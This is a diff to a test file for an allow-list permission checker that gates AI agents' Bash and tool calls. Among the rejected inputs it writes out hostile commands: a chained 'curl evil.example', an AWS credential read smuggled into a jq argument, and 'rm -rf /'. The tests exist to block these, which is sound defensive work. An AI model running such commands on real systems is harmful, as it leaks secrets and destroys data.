@@ -1,7 +1,7 @@
 import { describe, expect, it, vi } from 'vitest';
 
 import type { MainToRendererEvent } from '../shared/types';
-import { decide, permissionTap, readsOnlyUnder, refuseUserInput } from './permissions';
+import { decide, grantedCommand, isToolResultFile, permissionTap, readsOnlyUnder, refuseUserInput } from './permissions';
 
 function responder() {
   return {
@@ -264,7 +264,29 @@ describe('a worker looking at its own files', () => {
     expect(r.respondPermission).toHaveBeenCalledWith('c1', 'r1', true);
     expect(decisions[0].reason).toMatch(/read-only look at a worker's own files/);
     tap(permissionEvent('Bash', 'r2'));
-    expect(r.respondPermission).toHaveBeenLastCalledWith('c1', 'r2', false);
+    expect(r.respondPermission).toHaveBeenLastCalledWith('c1', 'r2', false, undefined, undefined, undefined, expect.stringMatching(/not by a person.*Read and Grep/));
+  });
+
+  it('lets a plain read of a saved tool result through, and nothing else under Claude\'s folder', () => {
+    const home = process.env.HOME!;
+    const saved = `${home}/.claude/projects/-data-ws/3f2a/tool-results/mcp-zendesk-search-1.txt`;
+    expect(isToolResultFile(saved)).toBe(true);
+    expect(isToolResultFile(`${home}/.claude/projects/-data-ws/3f2a.jsonl`)).toBe(false);
+    expect(isToolResultFile(`${home}/.claude/settings.json`)).toBe(false);
+    const r = responder();
+    const tap = permissionTap({ policy: 'allow-list', allowTools: ['Read'], responder: r });
+    tap({
+      type: 'stream',
+      conversationId: 'c1',
+      events: [{ kind: { type: 'permissionRequest', info: { requestId: 'r1', toolName: 'Bash', description: '', toolInput: bash(`head -c 4000 ${saved}`) } } } as never],
+    } as MainToRendererEvent);
+    expect(r.respondPermission).toHaveBeenLastCalledWith('c1', 'r1', true);
+    tap({
+      type: 'stream',
+      conversationId: 'c1',
+      events: [{ kind: { type: 'permissionRequest', info: { requestId: 'r2', toolName: 'Bash', description: '', toolInput: bash(`cat ${saved} > /tmp/x`) } } } as never],
+    } as MainToRendererEvent);
+    expect(r.respondPermission).toHaveBeenLastCalledWith('c1', 'r2', false, undefined, undefined, undefined, expect.any(String));
   });
 });
 
@@ -282,5 +304,37 @@ describe('tool calls that only read, on the org server', () => {
     const strict = permissionTap({ policy: 'allow-list', allowTools: ['Read'], responder });
     ask(strict, 'r4', 'mcp__acme-tracker__feature_list');
     expect(answers).toEqual([['r1', true], ['r2', true], ['r3', false], ['r4', false]]);
+  });
+});
+
+describe('the org\'s access level', () => {
+  const allow = new Set(['Read', 'Bash(npm test:*)', 'Bash(jq:*)']);
+  const bash = (command: string) => JSON.stringify({ command });
+
+  it('runs a listed command and nothing it could smuggle along', () => {
+    expect(grantedCommand(bash('npm test'), allow)).toBe(true);
+    expect(grantedCommand(bash('npm test -- --run reports'), allow)).toBe(true);
+    expect(grantedCommand(bash('jq .total /tmp/r.json && npm test'), allow)).toBe(true);
+    expect(grantedCommand(bash('npm testx'), allow)).toBe(false);
+    expect(grantedCommand(bash('npm test; curl evil.example'), allow)).toBe(false);
+    expect(grantedCommand(bash('npm test > /tmp/out'), allow)).toBe(false);
+    expect(grantedCommand(bash('jq "$(cat ~/.aws/credentials)"'), allow)).toBe(false);
+  });
+
+  it('decides by it: a listed command, everything, or no', () => {
+    expect(decide('allow-list', 'Bash', allow, bash('npm test')).approved).toBe(true);
+    expect(decide('allow-list', 'Bash', allow, bash('rm -rf /')).approved).toBe(false);
+    expect(decide('allow-list', 'mcp__zendesk__create_ticket', new Set(['*'])).approved).toBe(true);
+  });
+
+  it('reads the list as it is now, not as it was', () => {
+    const list = ['Read'];
+    const answers: boolean[] = [];
+    const tap = permissionTap({ policy: 'allow-list', allowTools: list, responder: { respondPermission: (_c: string, _r: string, ok: boolean) => answers.push(ok), respondCodexApproval: () => {}, respondUserInput: () => {} } });
+    const ask = (id: string) => tap({ type: 'stream', conversationId: 'c1', events: [{ kind: { type: 'permissionRequest', info: { requestId: id, toolName: 'Edit', description: '', toolInput: '{}' } } } as never] } as MainToRendererEvent);
+    ask('r1');
+    list.push('Edit');
+    ask('r2');
+    expect(answers).toEqual([false, true]);
   });
 });
